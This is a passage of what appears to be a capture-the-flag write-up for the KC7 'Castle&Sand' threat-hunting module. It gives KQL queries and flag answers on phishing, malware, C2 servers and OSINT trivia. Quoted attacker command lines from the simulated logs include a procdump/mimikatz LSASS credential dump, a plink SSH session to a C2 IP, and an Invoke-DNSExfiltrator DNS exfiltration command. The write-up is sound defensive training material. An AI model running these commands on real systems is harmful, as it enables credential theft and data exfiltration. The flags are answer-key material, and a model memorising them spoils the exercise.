If you take a look at `url` column accessed by IPs, you will notice urls with `download` keyword.

**[parse_urlquery](https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/parse-url-query-function)** function can be used to parse the query string in url. Parse the (json) output of function and get distinct filenames. (`tostring` required for `distinct`) 

```sql
InboundNetworkEvents
| where src_ip in (Q6Output)
| where url has 'download'
| distinct tostring(parse_urlquery(url)['Query Parameters']['output'])
| count 
```

::: tip Flag
`14`
:::

### 8: How many distinct IPs were involved in the stealing of downloaded data from the previous questions?

```sql
InboundNetworkEvents
| where src_ip in (Q6Output)
| where url has 'download'
| distinct src_ip
| count 
```

::: tip Flag
`9`
:::

### 9: Based on the IPs from Q6, how many unique domains did they resolve to?

For domains we need to use `PassiveDns` table.

```sql
PassiveDns
| where ip in (Q6Output)
| distinct domain
| count 
```

::: tip Flag
`5`
:::

### 10: Let's go back to the user accounts that may have been affected by the phishing campaign. How many hosts have they logged into?

Modify Question 6 query.

Since the attackers got inside machines we cant rule out the possibility of them using company's network to pivot to other machines.

```sql
AuthenticationEvents
| where username in (affectedEmployees)
| where result == 'Successful Login'
| distinct hostname
| count 
```

::: tip Flag
`43`
:::

### 11: Investigate the domains from Q9. How many files are present on Castle&Sand systems that originated from these domains?

First filter for _watering hole_ domains in `OutboundNetworkEvents`. <br>
Not all urls resolved to download, so I used **[parse_path](https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/parse-path-function)** function to extract Extension, filter empty Extension and then grab Filenames.<br>
After getting filenames we check `FileCreationEvents` for relevant files.

```sql
let requestedFilenames = OutboundNetworkEvents
| where url has_any (Q9Output)
| extend extension = parse_path(url).Extension
| where extension != ''
| distinct tostring(parse_path(url).Filename);
FileCreationEvents
| where filename in (requestedFilenames)
| count 
```

> Checking extension doesn't really matter for this case, because filenames will match themselves and extensionless files will get ignored. But cleaner data is always nice.
{. prompt-info } 

::: tip Flag
`15`
:::

### 12: Investigate what happens after these files are downloaded and find malicious activity. How many unique malware filenames are created from these files?

1. Get malicious filenames
2. Get downloaded filenames
3. Get hostnames where files got downloaded
4. Filter `FileCreationEvents`
    1. By hostname
    2. Add new column using [next](https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/next-function) function to get next row value in current row. [Practical Demonstation By TechBrothersIT](https://www.techbrothersit.com/2022/04/next-function-in-kusto-query-kusto.html)
    3. By malicious filenames
    4. Get next_filenames
    5. But not same filenames in 3

```sql
let requestedFilenames = OutboundNetworkEvents
| where url has_any (Q9Output)
| distinct tostring(parse_path(url).Filename);
let downloadedFiles = FileCreationEvents
| where filename in (requestedFilenames)
| distinct filename;
let downloadedFilesHosts = FileCreationEvents
| where filename in (requestedFilenames)
| distinct hostname;
FileCreationEvents
| where hostname in (downloadedFilesHosts)
| order by timestamp asc
| extend next_filename = next(filename, 1)
| where filename in (downloadedFiles)
| distinct next_filename  
| where not(next_filename in (downloadedFiles))
```

> procdump64 is part of [Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/), but is considered malicious because of usage (Check in ProcessEvents)

::: tip Flag
`5`
:::

### 13: How many of these files total are present on Castle&Sand systems?

```sql
let maliciousFiles = dynamic([
    'TSVIPSrv.dll',
    '1.exe',
    'i.exe',
    'wmi.dll',    
    'procdump64.exe'
]);
FileCreationEvents
| where filename in (maliciousFiles)
| count 
```

::: tip Flag
`14`
:::

### 14: How many distinct C2 servers are associated with the malware?

Since we are looking for C2 Servers we need to look for IPv4 addresses. First we filter processes by parent process name (malicious file) and then I used regex to filter for IPv4 in process_commandline. [extract](https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/extract-function) function to get regex pattern from column.

```sql
let maliciousFiles = dynamic([
    'TSVIPSrv.dll',
    '1.exe',
    'i.exe',
    'wmi.dll',    
    'procdump64.exe'
]);
let patternIP = @"((\d{1,3}\.){3}\d{1,3})";
ProcessEvents
| where parent_process_name in (maliciousFiles)
| where process_commandline matches regex patternIP
| project c2server = extract(patternIP, 0, process_commandline)
| distinct c2server
| count 
```

::: tip Flag
`7`
:::

### 15:  When is the first time you see this final action by the threat actor? Copy & paste the full timestamp.

_KC7: Now it's kind of a choose your own adventure. You need to find out what this threat actor did at the very end._

First let's start by getting all the records which are associated with malicious files.

```sql
let maliciousFiles = dynamic([
    'TSVIPSrv.dll',
    '1.exe',
    'i.exe',
    'wmi.dll',    
    'procdump64.exe'
]);
ProcessEvents
| where parent_process_name in (maliciousFiles)
| project timestamp, username, process_name, parent_process_name, process_commandline
```

Commands look mostly the same. The last effected user is `jojones`.<br>
2 commands was run on this user: 

I. `procdump64.exe -accepteula -ma lsass.exe lsass.dmp C:\mi.exe \"privilege::debug\" \"sekurlsa::logonpasswords full\" exit >> C:\log.txt mimikatz's sekurlsa::logonpasswords`
1. **Procdump (`procdump64.exe`):**
    - `procdump64.exe`: This is a command-line utility provided by Sysinternals (Microsoft) used for creating process dumps of running applications.
    - `-accepteula`: This flag is used to automatically accept the End-User License Agreement (EULA) when running Procdump.
    - `-ma`: This flag specifies that Procdump should create a full dump of the target process memory.
    - `lsass.exe`: This is the target process for which the memory dump is being created. `lsass.exe` is the Local Security Authority Subsystem Service on Windows.
    - `lsass.dmp`: This is the output file where the memory dump of the `lsass.exe` process will be saved.
2. **Mimikatz (`mimikatz.exe`):**
    - `C:\mi.exe`: This seems to be an executable file named "mi.exe" (or possibly "mimikatz.exe") located in the root of the C: drive.
    - `"privilege::debug"`: This is a command passed to Mimikatz. It grants the debug privilege to the process running Mimikatz. Debug privilege is necessary for certain operations, especially those interacting with LSASS (Local Security Authority Subsystem Service).
    - `"sekurlsa::logonpasswords full"`: This is another Mimikatz command. It instructs Mimikatz to perform a specific action - in this case, extracting logon passwords from LSASS (~dump credentials).
    - `exit`: This command is used to exit Mimikatz after the specified commands have been executed.
    - `>> C:\log.txt`: This redirects the standard output of Mimikatz to a file named "log.txt" in the root of the C: drive.

In summary, this command sequence uses Procdump to create a memory dump of the LSASS process and then uses Mimikatz to analyze that dump the credentials.

II. `plink.exe -i C:\Users\admin\.ssh\id_rsa 198.161.105.253 -q`
- `plink.exe`: This is the executable for Plink, a command-line SSH client for Windows.
- `-i C:\Users\admin\.ssh\id_rsa`: This flag specifies the private key file to be used for authentication. In this case, the private key is located at `C:\Users\admin\.ssh\id_rsa`.
- `198.161.105.253`: This is the IP address of the remote server to which you want to connect via SSH.
- `-q`: This flag stands for "quiet" and is used to suppress informational messages during the connection, making the output less verbose.

In summary, the command is initiating an SSH connection to the C2 server using the private key located at `C:\Users\admin\.ssh\id_rsa`, and suppressing additional informational messages with the `-q` flag. This is often used in automation scripts or scenarios where a quiet and automated connection is desired.

Now let's see what happens after `plink` was executed on `jojones` computer and filter for cmd/powershell for shell commands.

```sql
ProcessEvents
| where username == 'jojones'
| where timestamp > datetime('2023-05-17T09:20:15Z')
| where process_name in ('powershell.exe', 'cmd.exe')
```

Attacker seems to have enumerated the system with first commands and finally they used **[Invoke-DNSExfiltrator](https://github.com/Arno0x/DNSExfiltrator/tree/master)**: <br>
_DNSExfiltrator allows for transferring (exfiltrate) a file over a DNS request covert channel. This is basically a data leak testing tool allowing to exfiltrate data over a covert channel._

```powershell
cmd.exe whoami
cmd.exe ipconfig /all
cmd.exe net localgroup administrators /domain
cmd.exe nltest /dc:list
C:\Windows\System32\cmd.exe nslookup google.com
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" 
C:\Windows\System32\powershell.exe powershell Get-WmiObject -Class Win32_NetworkAdapterConfiguration
Import-Module Invoke-DNSExfiltrator.ps1
Invoke-DNSExfiltrator -i Invoke-DNSExfiltrator.ps1 -d exfil.castlesand.zip -p ssad3 -doh cloudflare -t 500
C:\Windows\System32\cmd.exe nslookup google.com
```

Filter for DNSExfiltrator and take the first time this command was executed.

```sql
ProcessEvents
| where process_commandline startswith 'Invoke-DNSExfiltrator'
| take 1
```

::: tip Flag
`2023-05-26T10:33:04Z`
:::

### 16: What MITRE Technique is this aligned with?

[**(T1048)** Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048/)

::: tip Flag
`T1048`
:::

### 17: How many hosts are affected by this action?

```sql
ProcessEvents
| where process_commandline startswith 'Invoke-DNSExfiltrator'
| count 
```

::: tip Flag
`14`
:::

### 18: How many distinct job roles were affected by this action?

```sql
let effectedUsers = ProcessEvents
| where process_commandline startswith 'Invoke-DNSExfiltrator'
| distinct username;
Employees
| where username in (effectedUsers)
| distinct role
```

::: tip Flag
`5`
:::

## Section 5: A clean sweep 🧹

### 1: Look up the IP addresses from Q8. Which IP address is in the country that hosted the winter olympics a few years ago?

We can use [MaxMind GeoIP](https://www.maxmind.com/en/geoip-demo) tool to lookup the IPs

| IP Address     | Location                                                 | Network           | Postal Code | Approximate Latitude / Longitude\*, and Accuracy Radius | ISP / Organization       | Domain         | Connection Type |
| -------------- | -------------------------------------------------------- | ----------------- | ----------- | ------------------------------------------------------- | ------------------------ | -------------- | --------------- |
| 156.155.83.236 | Vanderbijlpark, Gauteng, South Africa (ZA), Africa       | 156.155.83.128/25 | 1911        | -26.7005, 27.8179 (50 km)                               | Axxess Networks, Axxess  | internet.co.za | Cable/DSL       |
| 215.168.239.75 | United States (US), North America                        | 215.160.0.0/11    | -           | 37.751, -97.822 (1000 km)                               | US Military              | -              | Cable/DSL       |
| 223.9.222.59   | China (CN), Asia                                         | 223.9.128.0/17    | -           | 34.7732, 113.722 (1000 km)                              | China Telecom            | -              | Cable/DSL       |
| 43.185.57.65   | China (CN), Asia                                         | 43.184.0.0/14     | -           | 34.7732, 113.722 (1000 km)                              | -                        | -              | -               |
| 195.242.92.76  | Poland (PL), Europe                                      | 195.242.92.0/23   | -           | 52.2394, 21.0362 (200 km)                               | Netlink Sp. z o o        | nq.pl          | Cable/DSL       |
| 124.138.210.88 | South Korea (KR), Asia                                   | 124.138.192.0/19  | -           | 37.5112, 126.9741 (200 km)                              | SK Broadband, SK Telecom | -              | Cellular        |
| 192.91.130.34  | United States (US), North America                        | 192.91.128.0/22   | -           | 37.751, -97.822 (1000 km)                               | -                        | -              | -               |
| 190.198.227.17 | Caracas, Distrito Federal, Venezuela (VE), South America | 190.198.226.0/23  | -           | 10.4873, -66.8738 (500 km)                              | Cantv                    | cantv.net      | Cable/DSL       |
| 215.239.162.10 | United States (US), North America                        | 215.224.0.0/11    | -           | 37.751, -97.822 (1000 km)                               | US Military              | -              | Cable/DSL       |

Im writing in 2024 and don't know when the challenge was actually released, but probably in 2023?

I refered to the [official github](https://github.com/KC7-Foundation) repository and then [Castle&Sand blame](https://github.com/KC7-Foundation/kc7_data/blame/main/Castle%26Sand/castleandsand.com.md). Latest commit is 10 month old, so that places creation year to 2023! 

Some OSINT: [List of Olympic Games host cities](https://www.wikiwand.com/en/List_of_Olympic_Games_host_cities)

2023 doesnt have Olympic games. Last Winter Olympic games was in China, but that's 2022 and question mentions _a few years ago_. Before China it was South Korea in 2018.

::: tip Flag
`124.138.210.88`
:::

### 2: Which one hosted the winter Olympics recently? If there's more than one, post any of them.

Discussed in Question 1, so China.

::: tip Flag
`223.9.222.59` or `43.185.57.65`
:::

### 3: Search the malicious files found in Q12 on VirusTotal.com. Which file appears to not be malicious? Copy and paste the SHA256 hash.

```sql
let email = 'castleandsand_official@outlook.com';
let replyToEmails = Email
| where sender == email
| where recipient endswith 'castleandsand.com'
| distinct reply_to;
let affectedEmails = Email
| where sender in (replyToEmails)
| distinct recipient;
let affectedEmployees = Employees
| where email_addr in (affectedEmails)
| distinct username; // 1.
let Q6Output = AuthenticationEvents
| where not( src_ip in (Employees | distinct ip_addr) ) // 2.
| where username in (affectedEmployees) // 3.
| where result == 'Successful Login' // 4.
| distinct src_ip;
let Q9Output = PassiveDns
| where ip in (Q6Output)
| distinct domain;
let requestedFilenames = OutboundNetworkEvents
| where url has_any (Q9Output)
| distinct tostring(parse_path(url).Filename);
let downloadedFiles = FileCreationEvents
| where filename in (requestedFilenames)
| distinct filename;
let downloadedFilesHosts = FileCreationEvents
| where filename in (requestedFilenames)
| distinct hostname;
let maliciousFiles = FileCreationEvents
| where hostname in (downloadedFilesHosts)
| order by timestamp asc
| extend next_filename = next(filename, 1)
| where filename in (downloadedFiles)
| distinct next_filename;
FileCreationEvents
| where filename in (maliciousFiles)
| distinct sha256
```

Using the script from Section 3 Question 13 I checked small summary of hashes.

```bash
{'error': {'code': 'NotFoundError', 'message': 'File "28a181e8ebeda37943d17366eee83a5b677252891be6b4889c6a94f7e4b22671" not found'}}

Hash: 3e6c4e97cc09d0432fbbbf3f3e424d4aa967d3073b6002305cd6573c47f0341f
Meaningful Name: TSMSISrv.DLL
Popular Thread Label: trojan.shadowpad/vmprotect
Malicious: 57 / 76

{'error': {'code': 'NotFoundError', 'message': 'File "9d1d090ca4fca82b66ac3731c133fe6e8e1be331cfd6d6e378cebaede5afe006" not found'}}

Hash: c51c5bbc6f59407286276ce07f0f7ea994e76216e0abe34cbf20f1b1cbd9446d
Meaningful Name: <Not Found>
Popular Thread Label: trojan.winnti/byhw
Malicious: 56 / 76

{'error': {'code': 'NotFoundError', 'message': 'File "f822ef47a30b07308f1fa0e2dc261ebec77d0d173b0afaa27635b6511771a454" not found'}}

Hash: 5d971ed3947597fbb7e51d806647b37d64d9fe915b35c7c9eaf79a37b82dab90
Meaningful Name: TSMSISrv.DLL
Popular Thread Label: trojan.shadowpad/vmprotect
Malicious: 60 / 76

Hash: bb3d35cba3434f053280fc2887a7e6be703505385e184da4960e8db533cf4428
Meaningful Name: bb3d35cba3434f053280fc2887a7e6be703505385e184da4960e8db533cf4428.exe
Popular Thread Label: trojan.darkpink/doina
Malicious: 50 / 74

Hash: 63e8ed9692810d562adb80f27bb1aeaf48849e468bf5fd157bc83ca83139b6d7
Meaningful Name: 63e8ed9692810d562adb80f27bb1aeaf48849e468bf5fd157bc83ca83139b6d7.bin
Popular Thread Label: trojan.winnti/abcp
Malicious: 58 / 76

Hash: e2a7a9a803c6a4d2d503bb78a73cd9951e901beb5fb450a2821eaf740fc48496
Meaningful Name: procdump
Popular Thread Label: <Not Found>
Malicious: 0 / 76

Hash: 490c3e4af829e85751a44d21b25de1781cfe4961afdef6bb5759d9451f530994
Meaningful Name: 36711896cfeb67f599305b590f195aec.json
Popular Thread Label: trojan.winnti/lazy
Malicious: 60 / 76

{'error': {'code': 'NotFoundError', 'message': 'File "35ca10384a75de18555c5bf5265e2959ee7d65c4b9e21e0764c853949e777c38" not found'}}

{'error': {'code': 'NotFoundError', 'message': 'File "276f0c96b3d75afdf7ef899890a52db22242121c89c96bb97712a97aee043ea1" not found'}}
```

`procdump` was obvious, but always verify.

::: tip Flag
`e2a7a9a803c6a4d2d503bb78a73cd9951e901beb5fb450a2821eaf740fc48496`
:::

### 4: Who signed the file?

[VirusTotal Report: Details](https://www.virustotal.com/gui/file/e2a7a9a803c6a4d2d503bb78a73cd9951e901beb5fb450a2821eaf740fc48496/details)

::: tip Flag
`Microsoft`
:::

### 5: Research the malware files some more. Which threat actor group may have used these in the past?

Question 3 output has only 1 Meaningful Name with `.exe` extension:

[VirusTotal Report: Community](https://www.virustotal.com/gui/file/bb3d35cba3434f053280fc2887a7e6be703505385e184da4960e8db533cf4428/community)

::: tip Flag
[APT41](https://attack.mitre.org/groups/G0096/)
:::

### 6: For what you found in Section 4, Q15, who developed this malware? Paste their username.

S4Q15: <https://github.com/Arno0x/DNSExfiltrator>

::: tip Flag
`Arno0x`
:::

## Section 6: Security Jeopardy REDUX 🕺

### 1: What is KC7 Cyber's Twitter Handle?

_[KC7cyber](https://twitter.com/KC7cyber)_

::: tip Flag
`KC7cyber`
:::

### 2: What was the Sharky Ransomware Gang's Twitter Handle?

From S3Q1: [webyteyourdata](https://twitter.com/webyteyourdata/status/1665825830495219713)

::: tip Flag
`webyteyourdata`
:::

### 3: What KC7 Learning Module did we post on November 26, 2023? Copy and paste the name of the module

[https://kc7cyber.com](https://kc7cyber.com) > Resources > Learning Modules > JARM Fingerprinting

::: tip Flag
[https://kc7cyber.com/blog/jarm-fingerprinting](https://kc7cyber.com/blog/jarm-fingerprinting)
:::
### 4: What was the name of the company from KC7's game module about the culinary arts?

[https://kc7cyber.com/modules](https://kc7cyber.com/modules) > Search food > Dai Wok Foods

::: tip Flag
`Dai Wok Foods`
:::

### 5: How many bits are in a byte?

::: tip Flag
`8`
:::
### 6: How many megabytes are in a gigabyte?

::: tip Flag
`1000`
:::
### 7: Who on Twitter likes to IMPOSE COST to adversaries, and really likes Spiderman?

Googling the question literally ledme to him, lol 

[https://x.com/ImposeCost](https://x.com/ImposeCost)

::: tip Flag
`Andrew Thompson`
:::
### 8: What cybersecurity conference is focused on Detection Engineering And Threat Hunting? Provide the domain name of their website.

[https://deathcon.io](https://deathcon.io)

```
           DEATHCon
Detection Engineering and Threat Hunting
16-17 November 2024
```

::: tip Flag
[https://deathcon.io](https://deathcon.io)
:::
### 9: What SssSssSecurity conference focused on cyber crime is typically hosted recently in Arlington VA?

From google search it sounded like [https://www.cyberwarcon.com](https://www.cyberwarcon.com), but it turned out to be [https://www.sleuthcon.com](https://www.sleuthcon.com) (~Snakes)

::: tip Flag
`SLEUTHCON`
:::
### 10: What recent ZERO DAY vulnerability in late May / June 2023 where it was reported that the LACE TEMPEST group took responsibility for it? Copy & paste the CVE.

[Microsoft: Lace Tempest Hackers Behind Active Exploitation of MOVEit Transfer App](https://thehackernews.com/2023/06/microsoft-lace-tempest-hackers-behind.html): _"Exploitation is often followed by deployment of a web shell with data exfiltration capabilities," the **Microsoft Threat Intelligence** team [said](https://twitter.com/MsftSecIntel/status/1665537730946670595) in a series of tweets today. "**CVE-2023-34362** allows attackers to authenticate as any user."_

::: tip Flag
`CVE-2023-34362`
:::
### 11: Who is claiming responsibility for the DDOS attacks at a well know tech company? (June 2023)

[Anonymous Sudan (Storm-1359) campaign against Microsoft](https://atos.net/en/lp/securitydive/distributed-denial-of-2023#:~:text=Microsoft%20suffered%20multiple%20attacks%20on,attacks%20targeting%20several%20US%20companies.)

::: tip Flag
`Anonymous Sudan`
:::
### 12: 🤫 📡 You intercepted a secret transmission

Message: `eWV2dG5pbnkgcWFuIGxib2VudWY=`

The base64 decoded seemed like ROT13, but after trying each rotation nothing came up. But what if it was rotated and then reversed and then base64 encoded?
```bash
└─$ echo 'eWV2dG5pbnkgcWFuIGxib2VudWY=' | base64 -d | rev | tr 'A-Za-z' 'N-ZA-Mn-za-m'
sharboy and lavagirl
```

> **Note**: shar**k**boy seems to be missing a character.

::: tip Flag
sharkboy and lavagirl
:::
### 13: Binary blob

```bash
01101000 01110100 01110100 01110000 01110011 00111010 00101111 00101111 01111001 01101111 01110101 01110100 01110101 00101110 01100010 01100101 00101111 01100100 01010001 01110111 00110100 01110111 00111001 01010111 01100111 01011000 01100011 01010001
```

Decode the binary code into ascii. Binary -> Integer -> Ascii 
```bash
└─$ py
Python 3.11.9 (main, Apr 10 2024, 13:16:36) [GCC 13.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> s='01101000 01110100 01110100 01110000 01110011 00111010 00101111 00101111 01111001 01101111 01110101 01110100 01110101 00101110 01100010 01100101 00101111 01100100 01010001 01110111 00110100 01110111 00111001 01010111 01100111 01011000 01100011 01010001'
>>> ''.join(chr(int(i, 2)) for i in s.split())
'https://youtu.be/dQw4w9WgXcQ'
```

::: tip Flag
[https://youtu.be/dQw4w9WgXcQ](https://youtu.be/dQw4w9WgXcQ) (It's a f\*cking RickRoll 🤣 Well played KC7... well played)
:::

---

I previously had to leave for some time and questions got changed, leaving solved ones:
### 5: Who's KC7's Software Engineering Intern?

OSINT the company [About Us](https://kc7foundation.org/people/)

::: tip Flag
`Garrett Clark`
:::

### 6: Who's KC7's Content Development Intern?

Same approach as Question 5

::: tip Flag
`Cristina Genao`
:::
